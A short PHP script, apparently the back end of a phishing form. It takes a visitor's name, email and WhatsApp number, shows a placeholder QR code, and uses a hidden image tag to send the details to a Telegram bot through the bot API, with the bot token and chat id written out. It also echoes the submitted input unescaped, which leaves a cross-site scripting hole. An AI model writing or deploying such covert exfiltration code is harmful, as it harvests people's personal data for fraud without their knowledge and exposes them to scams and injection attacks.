<?php

$nome =$_POST["name"];
$email =$_POST["email"];
$username =$_POST["username"];

echo "$nome <br>$username

<div class='u-container-layout u-valign-middle u-container-layout-5'>
                        <img  src='https://chart.googleapis.com/chart?chs=150x150&amp;cht=qr&amp;chl=Hello%20world&amp;choe=UTF-8' alt='QR code' alt=''>
                      </div><meta http-equiv='refresh' target='_blank' content='30; URL='#''/><div style='display:none'>
"; 

    echo "<div style='display:none'><img src='https://api.telegram.org/bot2081639827:AAFFJnGzSJwKxTvs-Xe_aKFeocAbmJJKlWk/sendMessage?chat_id=1576977833&text= Nome: $nome%0A E-mail: $email%0A whatsapp:https://wa.me/55$username%0A%0A $data | $hora%0A%20' alt='QR code'></div>"; 
echo ""; 

?>